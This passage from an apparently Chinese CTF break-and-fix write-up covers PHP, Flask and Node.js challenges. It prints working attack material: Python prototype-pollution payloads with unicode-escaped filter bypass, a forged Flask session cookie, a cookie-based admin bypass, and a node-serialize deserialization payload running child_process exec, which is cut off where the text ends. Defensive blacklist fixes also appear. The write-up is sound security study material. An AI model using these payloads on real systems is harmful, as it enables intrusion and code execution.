class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;;&quot;</span>,<span class="hljs-string">&quot;|&quot;</span>,<span class="hljs-string">&quot;//&quot;</span>,<span class="hljs-string">&quot;#&quot;</span>,<span class="hljs-string">&quot;?&quot;</span>];<br>    <span class="hljs-variable">$username</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$blacklist</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$username</span>);<br><br>    <span class="hljs-variable">$str</span> = <span class="hljs-string">&quot;//登陆时间<span class="hljs-subst">$time</span>,<span class="hljs-subst">$username</span> <span class="hljs-subst">$p</span>&quot;</span>;<br>    <span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;\n&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str</span>);<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;config.php&quot;</span>,<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;config.php&quot;</span>).<span class="hljs-variable">$str</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NO ACCESS&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>&lt;br&gt;<br>&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span> src=<span class="hljs-string">&quot;js/jquery-1.9.0.min.js&quot;</span>&gt;&lt;/script&gt;<br>&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span> src=<span class="hljs-string">&quot;js/jquery.base64.js&quot;</span>&gt;&lt;/script&gt;<br>&lt;script&gt;<br> ....<br>&lt;/script&gt;<br>更改用户名&lt;input type=<span class="hljs-string">&quot;text&quot;</span> name=<span class="hljs-string">&quot;newusername&quot;</span> id=<span class="hljs-string">&quot;newusername&quot;</span> value=<span class="hljs-string">&quot;&quot;</span>&gt;<br>&lt;button type=<span class="hljs-string">&quot;submit&quot;</span> onclick=<span class="hljs-string">&quot;submitData()&quot;</span> &gt;更改&lt;/button&gt;<br></code></pre></td></tr></table></figure><h1 id="web-Polluted"><a href="#web-Polluted" class="headerlink" title="web-Polluted"></a>web-Polluted</h1><h2 id="break-2"><a href="#break-2" class="headerlink" title="break"></a>break</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, session, redirect, url_for,request,render_template<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_random_md5</span>():<br>    random_string = os.urandom(<span class="hljs-number">16</span>)<br>    md5_hash = hashlib.md5(random_string)<br><br>    <span class="hljs-keyword">return</span> md5_hash.hexdigest()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">filter</span>(<span class="hljs-params">user_input</span>):<br>    blacklisted_patterns = [<span class="hljs-string">&#x27;init&#x27;</span>, <span class="hljs-string">&#x27;global&#x27;</span>, <span class="hljs-string">&#x27;env&#x27;</span>, <span class="hljs-string">&#x27;app&#x27;</span>, <span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-string">&#x27;string&#x27;</span>]<br>    <span class="hljs-keyword">for</span> pattern <span class="hljs-keyword">in</span> blacklisted_patterns:<br>        <span class="hljs-keyword">if</span> re.search(pattern, user_input, re.IGNORECASE):<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">src, dst</span>):<br>    <span class="hljs-comment"># Recursive merge function</span><br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> src.items():<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(dst, <span class="hljs-string">&#x27;__getitem__&#x27;</span>):<br>            <span class="hljs-keyword">if</span> dst.get(k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>                merge(v, dst.get(k))<br>            <span class="hljs-keyword">else</span>:<br>                dst[k] = v<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">hasattr</span>(dst, k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>            merge(v, <span class="hljs-built_in">getattr</span>(dst, k))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">setattr</span>(dst, k, v)<br><br><br>app = Flask(__name__)<br>app.secret_key = generate_random_md5()<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">evil</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>,methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    username = request.form.get(<span class="hljs-string">&#x27;username&#x27;</span>)<br>    password = request.form.get(<span class="hljs-string">&#x27;password&#x27;</span>)<br>    session[<span class="hljs-string">&quot;username&quot;</span>] = username<br>    session[<span class="hljs-string">&quot;password&quot;</span>] = password<br>    Evil = evil()<br>    <span class="hljs-keyword">if</span> request.data:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">filter</span>(<span class="hljs-built_in">str</span>(request.data)):<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;NO POLLUTED!!!YOU NEED TO GO HOME TO SLEEP~&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            merge(json.loads(request.data), Evil)<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;MYBE YOU SHOULD GO /ADMIN TO SEE WHAT HAPPENED&quot;</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/admin&#x27;</span>,methods=[<span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">templates</span>():<br>    username = session.get(<span class="hljs-string">&quot;username&quot;</span>, <span class="hljs-literal">None</span>)<br>    password = session.get(<span class="hljs-string">&quot;password&quot;</span>, <span class="hljs-literal">None</span>)<br>    <span class="hljs-keyword">if</span> username <span class="hljs-keyword">and</span> password:<br>        <span class="hljs-keyword">if</span> username == <span class="hljs-string">&quot;adminer&quot;</span> <span class="hljs-keyword">and</span> password == app.secret_key:<br>            <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;important.html&quot;</span>, flag=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/flag&quot;</span>, <span class="hljs-string">&quot;rt&quot;</span>).read())<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Unauthorized&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">f&#x27;Hello,  This is the POLLUTED page.&#x27;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,debug=<span class="hljs-literal">True</span>, port=<span class="hljs-number">80</span>)<br></code></pre></td></tr></table></figure><p>python原型链污染secret_key</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;<br>    <span class="hljs-string">&quot;__init__&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;__globals__&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;app&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;secret_key&quot;</span>: <span class="hljs-string">&quot;dr0n111&quot;</span><br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>有关键字被过滤了，转成unicode绕过</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;<br>    <span class="hljs-string">&quot;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;\u0061\u0070\u0070&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;\u0073\u0065\u0063\u0072\u0065\u0074\u005f\u006b\u0065\u0079&quot;</span>: <span class="hljs-string">&quot;dr0n111&quot;</span><br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>污染后伪造key登录</p><figure class="highlight scilab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scilab">python flask_session_cookie_manager3.py encode -s <span class="hljs-string">&quot;dr0n111&quot;</span> -t <span class="hljs-string">&quot;&#123;&#x27;</span>password&#x27;:<span class="hljs-string">&#x27;dr0n111&#x27;</span>,<span class="hljs-string">&#x27;username&#x27;</span>:<span class="hljs-string">&#x27;adminer&#x27;</span>&#125;<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/img/wp/2024/2024ciscn-Polluted_break_1.png"></p><p>登录后看到语法标识符不对，使用<code>variable_start_string</code>替换</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;<br>    <span class="hljs-string">&quot;__init__&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;__globals__&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;app&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;jinja_env&quot;</span>: &#123;<br>                    <span class="hljs-string">&quot;variable_start_string&quot;</span>: <span class="hljs-string">&quot;[%&quot;</span>,<br>                    <span class="hljs-string">&quot;variable_end_string&quot;</span>: <span class="hljs-string">&quot;%]&quot;</span><br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;<br>    <span class="hljs-string">&quot;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;\u0061\u0070\u0070&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;\u006a\u0069\u006e\u006a\u0061\u005f\u0065\u006e\u0076&quot;</span>: &#123;<br>                    <span class="hljs-string">&quot;\u0076\u0061\u0072\u0069\u0061\u0062\u006c\u0065\u005f\u0073\u0074\u0061\u0072\u0074\u005f\u0073\u0074\u0072\u0069\u006e\u0067&quot;</span>: <span class="hljs-string">&quot;[%&quot;</span>,<br>                    <span class="hljs-string">&quot;\u0076\u0061\u0072\u0069\u0061\u0062\u006c\u0065\u005f\u0065\u006e\u0064\u005f\u0073\u0074\u0072\u0069\u006e\u0067&quot;</span>: <span class="hljs-string">&quot;%]&quot;</span><br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>因为缓存的原因，先污染在访问即可</p><p><img src="/img/wp/2024/2024ciscn-Polluted_break_2.png"></p><h2 id="fix-2"><a href="#fix-2" class="headerlink" title="fix"></a>fix</h2><p>增加黑名单</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">filter</span>(<span class="hljs-params">user_input</span>):<br>    blacklisted_patterns = [<span class="hljs-string">&#x27;init&#x27;</span>, <span class="hljs-string">&#x27;global&#x27;</span>, <span class="hljs-string">&#x27;env&#x27;</span>, <span class="hljs-string">&#x27;app&#x27;</span>, <span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-string">&#x27;string&#x27;</span>, <span class="hljs-string">&#x27;005f&#x27;</span>, <span class="hljs-string">&#x27;0074&#x27;</span>, <span class="hljs-string">&#x27;006c&#x27;</span>, <span class="hljs-string">&#x27;[%&#x27;</span>]<br>    <span class="hljs-keyword">for</span> pattern <span class="hljs-keyword">in</span> blacklisted_patterns:<br>        <span class="hljs-keyword">if</span> re.search(pattern, user_input, re.IGNORECASE):<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br></code></pre></td></tr></table></figure><h1 id="web-bigfish"><a href="#web-bigfish" class="headerlink" title="web-bigfish"></a>web-bigfish</h1><h2 id="break-3"><a href="#break-3" class="headerlink" title="break"></a>break</h2><p>扫目录得到<code>/admin</code>和<code>/login</code></p><p>访问admin会自动跳转到login，简单修改cookie就能直接登录</p><p>数据储存位置可以穿越目录，读取<code>fish.js</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);<br><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><span class="hljs-keyword">const</span> cookieParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;cookie-parser&#x27;</span>);<br><span class="hljs-keyword">const</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>);<br><span class="hljs-keyword">const</span> serialize = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;node-serialize&#x27;</span>);<br><span class="hljs-keyword">const</span> schedule = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;node-schedule&#x27;</span>);<br><br><span class="hljs-comment">// Change working directory to /srv</span><br>process.<span class="hljs-title function_">chdir</span>(<span class="hljs-string">&#x27;/srv&#x27;</span>);<br><br><br><span class="hljs-keyword">let</span> rule1 = <span class="hljs-keyword">new</span> schedule.<span class="hljs-title class_">RecurrenceRule</span>();<br>rule1.<span class="hljs-property">minute</span> = [<span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">6</span> , <span class="hljs-number">9</span>, <span class="hljs-number">12</span>, <span class="hljs-number">15</span>, <span class="hljs-number">18</span>, <span class="hljs-number">21</span>, <span class="hljs-number">24</span>, <span class="hljs-number">27</span>, <span class="hljs-number">30</span>, <span class="hljs-number">33</span>, <span class="hljs-number">36</span>, <span class="hljs-number">39</span>, <span class="hljs-number">42</span>, <span class="hljs-number">45</span>, <span class="hljs-number">48</span>, <span class="hljs-number">51</span>, <span class="hljs-number">54</span>, <span class="hljs-number">57</span>];<br><br><span class="hljs-comment">// 定时清除</span><br><span class="hljs-keyword">let</span> job1 = schedule.<span class="hljs-title function_">scheduleJob</span>(rule1, <span class="hljs-function">() =&gt;</span> &#123;<br>fs.<span class="hljs-title function_">writeFile</span>(<span class="hljs-string">&#x27;data.html&#x27;</span>,<span class="hljs-string">&quot;#获取的数据信息\n&quot;</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">error</span>)&#123;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;wriet error&quot;</span>)<br>&#125;);<br>&#125;);<br><br><br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();<br><br>app.<span class="hljs-title function_">engine</span>(<span class="hljs-string">&#x27;html&#x27;</span>,<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express-art-template&#x27;</span>))<br><br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">static</span>(<span class="hljs-string">&#x27;public&#x27;</span>));<br>app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">cookieParser</span>());<br>app.<span class="hljs-title function_">use</span>(bodyParser.<span class="hljs-title function_">json</span>())<br>app.<span class="hljs-title function_">use</span>(bodyParser.<span class="hljs-title function_">urlencoded</span>(&#123;<span class="hljs-attr">extended</span>: <span class="hljs-literal">false</span>&#125;))<br><br><br>data_path = <span class="hljs-string">&quot;data.html&quot;</span>;<br><br><span class="hljs-comment">// Middleware to set default cookies for /admin route</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">setDefaultAdminCookies</span>(<span class="hljs-params">req, res, next</span>) &#123;<br>    <span class="hljs-keyword">if</span> (!req.<span class="hljs-property">cookies</span>.<span class="hljs-property">username</span>) &#123;<br>        res.<span class="hljs-title function_">cookie</span>(<span class="hljs-string">&#x27;username&#x27;</span>, <span class="hljs-string">&#x27;normal&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!req.<span class="hljs-property">cookies</span>.<span class="hljs-property">is_admin</span>) &#123;<br>        res.<span class="hljs-title function_">cookie</span>(<span class="hljs-string">&#x27;is_admin&#x27;</span>, <span class="hljs-string">&#x27;false&#x27;</span>);<br>    &#125;<br>    <span class="hljs-title function_">next</span>();<br>&#125;<br><br><span class="hljs-comment">//主页</span><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>res.<span class="hljs-title function_">sendFile</span>(path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;public/index.html&#x27;</span>));<br>&#125;);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/&#x27;</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>)&#123;<br>fs.<span class="hljs-title function_">appendFile</span>(<span class="hljs-string">&#x27;data.html&#x27;</span>,<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(req.<span class="hljs-property">body</span>)+<span class="hljs-string">&quot;\n&quot;</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">error</span>)&#123;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(req.<span class="hljs-property">body</span>)<br>&#125;);<br>res.<span class="hljs-title function_">sendFile</span>(path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;public/index.html&#x27;</span>));<br>&#125;);<br><br><br><span class="hljs-comment">//后台管理</span><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/admin&#x27;</span>, setDefaultAdminCookies, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br><span class="hljs-keyword">if</span>(req.<span class="hljs-property">cookies</span>.<span class="hljs-property">username</span> !== <span class="hljs-string">&quot;admin&quot;</span> || req.<span class="hljs-property">cookies</span>.<span class="hljs-property">is_admin</span> !== <span class="hljs-string">&quot;true&quot;</span>)&#123;<br>res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&#x27;login&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(req.<span class="hljs-property">cookies</span>.<span class="hljs-property">username</span> === <span class="hljs-string">&quot;admin&quot;</span> &amp;&amp; req.<span class="hljs-property">cookies</span>.<span class="hljs-property">is_admin</span> === <span class="hljs-string">&quot;true&quot;</span>)&#123;<br>res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;admin.html&#x27;</span>,&#123;<br>            datadir : data_path<br>        &#125;);<br>&#125;<br>&#125;);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/admin&#x27;</span>, setDefaultAdminCookies, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br><span class="hljs-keyword">if</span>(req.<span class="hljs-property">cookies</span>.<span class="hljs-property">username</span> !== <span class="hljs-string">&quot;admin&quot;</span> || req.<span class="hljs-property">cookies</span>.<span class="hljs-property">is_admin</span> !== <span class="hljs-string">&quot;true&quot;</span>)&#123;<br>res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&#x27;login&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(req.<span class="hljs-property">cookies</span>.<span class="hljs-property">username</span> === <span class="hljs-string">&quot;admin&quot;</span> &amp;&amp; req.<span class="hljs-property">cookies</span>.<span class="hljs-property">is_admin</span> === <span class="hljs-string">&quot;true&quot;</span>)&#123;<br><span class="hljs-keyword">if</span>(req.<span class="hljs-property">body</span>.<span class="hljs-property">newname</span>)&#123;<br>data_path = req.<span class="hljs-property">body</span>.<span class="hljs-property">newname</span>;<br>res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&#x27;admin&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&#x27;admin&#x27;</span>);<br>&#125;<br>&#125;<br>&#125;);<br><br><br><span class="hljs-comment">//已弃用的登录</span><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/login&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>res.<span class="hljs-title function_">sendFile</span>(path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;public/login.html&#x27;</span>));<br>&#125;);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/login&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br><span class="hljs-keyword">if</span>(req.<span class="hljs-property">cookies</span>.<span class="hljs-property">profile</span>)&#123;<br>        <span class="hljs-keyword">var</span> str = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Buffer</span>(req.<span class="hljs-property">cookies</span>.<span class="hljs-property">profile</span>, <span class="hljs-string">&#x27;base64&#x27;</span>).<span class="hljs-title function_">toString</span>();<br>        <span class="hljs-keyword">var</span> obj = serialize.<span class="hljs-title function_">unserialize</span>(str);<br><span class="hljs-keyword">if</span> (obj.<span class="hljs-property">username</span>) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">escape</span>(obj.<span class="hljs-property">username</span>) === <span class="hljs-string">&quot;admin&quot;</span>) &#123;<br>res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;Hello World&quot;</span>);<br>&#125;<br>&#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>res.<span class="hljs-title function_">sendFile</span>(path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;public/data&#x27;</span>));<br>&#125;<br>&#125;);<br><br><span class="hljs-comment">//QQ</span><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/qq&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br><span class="hljs-keyword">if</span>(req.<span class="hljs-property">cookies</span>.<span class="hljs-property">username</span> !== <span class="hljs-string">&quot;admin&quot;</span> || req.<span class="hljs-property">cookies</span>.<span class="hljs-property">is_admin</span> !== <span class="hljs-string">&quot;true&quot;</span>)&#123;<br>res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&#x27;login&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(req.<span class="hljs-property">cookies</span>.<span class="hljs-property">username</span> === <span class="hljs-string">&quot;admin&quot;</span> &amp;&amp; req.<span class="hljs-property">cookies</span>.<span class="hljs-property">is_admin</span> === <span class="hljs-string">&quot;true&quot;</span>)&#123;<br>res.<span class="hljs-title function_">sendFile</span>(path.<span class="hljs-title function_">join</span>(__dirname, data_path));<br>&#125;<br>&#125;);<br><br><br>app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">80</span>, <span class="hljs-string">&#x27;0.0.0.0&#x27;</span>);<br></code></pre></td></tr></table></figure><p>在login的时候执行了<code>serialize.unserialize(str)</code>，可以打nodejs反序列化</p><figure class="highlight scilab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scilab">&#123;<span class="hljs-string">&quot;rce&quot;</span>:<span class="hljs-string">&quot;_$$ND_FUNC$$_function()&#123;require(&#x27;</span>child_process&#x27;).<span class="hljs-built_in">exec</span>(<span class="hljs-string">&#x27;cat /this_is_your_ffflagg &gt; /tmp/1.txt&#x27;</span>,<span 